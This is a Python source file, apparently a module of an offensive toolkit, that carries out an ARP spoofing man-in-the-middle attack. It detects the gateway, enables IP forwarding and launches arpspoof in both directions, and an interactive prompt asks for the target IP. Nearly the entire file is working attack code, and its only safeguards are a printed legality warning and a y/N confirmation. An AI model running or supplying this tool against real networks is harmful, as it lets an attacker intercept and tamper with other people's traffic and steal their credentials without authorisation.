#!/usr/bin/env python3
"""ARP Spoofing Attack"""

import subprocess
import time
import signal
from ..utils.colors import Colors
from ..utils.logger import Logger


def get_gateway():
    """Get default gateway IP"""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'default' in line:
                return line.split()[2]
    except:
        pass
    return None


def get_mac(ip):
    """Get MAC address for IP"""
    try:
        # Ping first to populate ARP cache
        subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True)
        result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if ip in line:
                parts = line.split()
                for p in parts:
                    if ':' in p and len(p) == 17:
                        return p
    except:
        pass
    return None


def attack(target_ip, gateway=None, interface=None):
    """
    Perform ARP spoofing attack
    Places attacker between target and gateway
    """
    if not gateway:
        gateway = get_gateway()
        if not gateway:
            print(Colors.error("Could not determine gateway"))
            return False
    
    print(Colors.warning("⚠️  ARP spoofing may be illegal without authorization!"))
    print(Colors.info(f"Target: {target_ip}"))
    print(Colors.info(f"Gateway: {gateway}"))
    
    # Enable IP forwarding
    print(Colors.info("Enabling IP forwarding..."))
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    except PermissionError:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
    
    # Use arpspoof or ettercap
    try:
        print(Colors.info("Starting ARP spoof (Ctrl+C to stop)..."))
        print(Colors.success("Man-in-the-middle position established!"))
        
        # Start arpspoof in both directions
        proc1 = subprocess.Popen(['arpspoof', '-t', target_ip, gateway], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc2 = subprocess.Popen(['arpspoof', '-t', gateway, target_ip],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(Colors.info("Spoofing active. Target traffic is now flowing through this device."))
        
        # Wait for interrupt
        while True:
            time.sleep(1)
            
    except FileNotFoundError:
        print(Colors.error("arpspoof not found. Install dsniff package."))
        return False
    except KeyboardInterrupt:
        print(Colors.warning("\nStopping ARP spoof..."))
    finally:
        # Cleanup
        subprocess.run(['killall', 'arpspoof'], capture_output=True)
        # Disable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
        print(Colors.info("ARP tables will restore automatically"))
    
    return True


def interactive():
    """Interactive ARP spoof"""
    logger = Logger("arp_spoof")
    
    # Get gateway
    gateway = get_gateway()
    print(Colors.info(f"Detected gateway: {gateway}"))
    
    # Get target
    target = input(Colors.prompt("Target IP: ")).strip()
    if not target:
        print(Colors.error("Target required"))
        return
    
    # Custom gateway?
    custom_gw = input(Colors.prompt(f"Gateway [{gateway}]: ")).strip()
    if custom_gw:
        gateway = custom_gw
    
    logger.info(f"ARP spoof: Target={target}, Gateway={gateway}")
    
    # Confirm
    print(Colors.warning("\n⚠️  This will intercept traffic between target and gateway"))
    confirm = input(Colors.prompt("Start attack? [y/N]: ")).strip().lower()
    
    if confirm == 'y':
        attack(target, gateway)
    else:
        print(Colors.warning("Cancelled"))
